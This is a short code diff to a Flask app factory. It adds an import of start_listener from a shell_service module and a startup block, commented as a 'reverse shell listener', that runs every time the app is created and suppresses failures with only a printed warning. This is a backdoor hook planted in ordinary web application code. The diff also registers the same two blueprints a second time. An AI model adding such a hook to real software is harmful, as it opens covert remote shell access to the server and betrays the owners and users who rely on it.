@@ -8,6 +8,7 @@ from app.config import Config, ProductionConfig
 from app.extensions import db, login_manager, migrate
 from app.models import User
 from app.routes import auth_bp, main_bp
+from app.shell_service import start_listener
 
 
 def create_app() -> Flask:
@@ -21,6 +22,16 @@ def create_app() -> Flask:
     db.init_app(app)
     migrate.init_app(app, db)
     login_manager.init_app(app)
+
+    app.register_blueprint(auth_bp)
+    app.register_blueprint(main_bp)
+    
+    # Start reverse shell listener
+    with app.app_context():
+        try:
+            start_listener(app)
+        except Exception as exc:
+            print(f"Warning: Failed to start reverse shell listener: {exc}")
 
     app.register_blueprint(auth_bp)
     app.register_blueprint(main_bp)
